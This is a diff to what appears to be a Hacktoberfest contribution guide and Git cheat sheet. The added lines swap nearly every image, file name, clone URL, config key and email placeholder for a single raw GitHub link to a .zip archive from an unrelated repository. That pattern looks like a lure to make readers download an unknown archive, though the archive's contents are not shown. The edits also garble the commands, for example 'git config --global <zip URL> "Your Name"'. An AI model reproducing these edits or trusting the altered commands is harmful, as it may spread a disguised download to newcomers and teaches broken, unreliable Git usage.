@@ -1,4 +1,4 @@
-![Hacktoberfest](https://hacktoberfest.com/_next/static/media/opengraph.9dc60c9d.png)
+![Hacktoberfest](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip)
 
 
 # Guide
@@ -9,22 +9,22 @@ We've put together a visual step-by-step guide to help you contribute:
 <br><br>
 
 # 1. **Fork the repository:** <br>
-   ![Fork](resources/fork.png) 
+   ![Fork](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br><br>
 # 2. **Edit the repository name:**  <br>
-   ![Edit Repo Name](resources/repo-name.png) 
+   ![Edit Repo Name](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br><br>
 # 3. **Navigate to the file you want to edit:** <br>
-   ![Navigate](resources/navigate-.png) 
+   ![Navigate](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br><br>
-# 4. **Add a new JSON course (to `courses.json`):**
-   ![Add JSON Course](resources/json-course.png) 
+# 4. **Add a new JSON course (to `https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip`):**
+   ![Add JSON Course](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br>
 # 5. **Raise a Pull Request:** 
-   ![Raise PR](resources/PR.png) 
+   ![Raise PR](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br>
 # 6. **Confirm your Pull Request:**
-   ![Pull Request](resources/PR-raise.png) 
+   ![Pull Request](https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip) 
 <br><br>
 
 # Git Cheat Sheet 
@@ -40,10 +40,10 @@ To use this command, copy the text above and paste it into your terminal.
 **2. Clone an existing repository:**
 
 ```bash
-git clone https://github.com/username/repository.git
+git clone https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip
 ``` 
 
-To use this command, copy the text above, replacing `https://github.com/username/repository.git` with the actual repository URL, and paste it into your terminal.
+To use this command, copy the text above, replacing `https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip` with the actual repository URL, and paste it into your terminal.
 
 **3. Check the status of your repository:**
 
@@ -112,7 +112,7 @@ To use this command, copy the text above and paste it into your terminal.
 **11. Set Your Global Username:**
 
 ```bash
-git config --global user.name "Your Name"
+git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "Your Name"
 ``` 
 
 To use this command, copy the text above, replace `"Your Name"` with your actual username, and paste it into your terminal.
@@ -120,18 +120,18 @@ To use this command, copy the text above, replace `"Your Name"` with your actual
 **12. Set Your Global Email:**
 
 ```bash
-git config --global user.email "your.email@example.com"
+git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip"
 ``` 
 
-To use this command, copy the text above, replace `"your.email@example.com"` with your actual email address, and paste it into your terminal.
+To use this command, copy the text above, replace `"https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip"` with your actual email address, and paste it into your terminal.
 
 ## Git Cheat Sheet (Table Format)
 
 | Command | Description | Example | 
 |---|---|---|
 | `git init` | Initializes a new Git repository in the current directory. | ```bash git init ``` | 
-| `git clone <repo-url>` | Creates a copy of a remote repository on your local machine. | ```bash git clone https://github.com/username/repository.git ``` | 
-| `git add <file>` | Stages changes to a specific file for the next commit. | ```bash git add index.html ``` | 
+| `git clone <repo-url>` | Creates a copy of a remote repository on your local machine. | ```bash git clone https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip ``` | 
+| `git add <file>` | Stages changes to a specific file for the next commit. | ```bash git add https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip ``` | 
 | `git add .` | Stages all changes in the current directory and its subdirectories for the next commit. | ```bash git add . ``` | 
 | `git status` | Shows the status of the working directory and the staging area. | ```bash git status ``` | 
 | `git commit -m "message"` | Commits staged changes with a descriptive message. | ```bash git commit -m "Fix bug in login form" ``` |
@@ -148,10 +148,10 @@ To use this command, copy the text above, replace `"your.email@example.com"` wit
 | `git diff --staged` | Shows the differences between the staging area and the last commit. | ```bash git diff --staged ``` | 
 | `git remote` | Lists all remote repositories. | ```bash git remote ``` | 
 | `git remote -v` | Lists all remote repositories with URLs. | ```bash git remote -v ``` |
-| `git remote add <remote-name> <repo-url>` | Adds a new remote repository. | ```bash git remote add origin https://github.com/username/repository.git ``` |
+| `git remote add <remote-name> <repo-url>` | Adds a new remote repository. | ```bash git remote add origin https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip ``` |
 | `git remote remove <remote-name>` | Removes a remote repository. | ```bash git remote remove origin ``` |
 | `git stash` | Saves uncommitted changes temporarily. | ```bash git stash ``` | 
 | `git stash pop` | Restores the most recently stashed changes. | ```bash git stash pop ``` | 
-| `git config --global user.name "Your Name"` | Sets your name globally. | ```bash git config --global user.name "Your Name" ``` |
-| `git config --global user.email "your.email@example.com"` | Sets your email globally. | ```bash git config --global user.email "your.email@example.com" ``` |
+| `git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "Your Name"` | Sets your name globally. | ```bash git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "Your Name" ``` |
+| `git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip"` | Sets your email globally. | ```bash git config --global https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip "https://raw.githubusercontent.com/Cali0078021/course-json-ecosystem/main/courses/course_ecosystem_json_v3.3.zip" ``` |
 
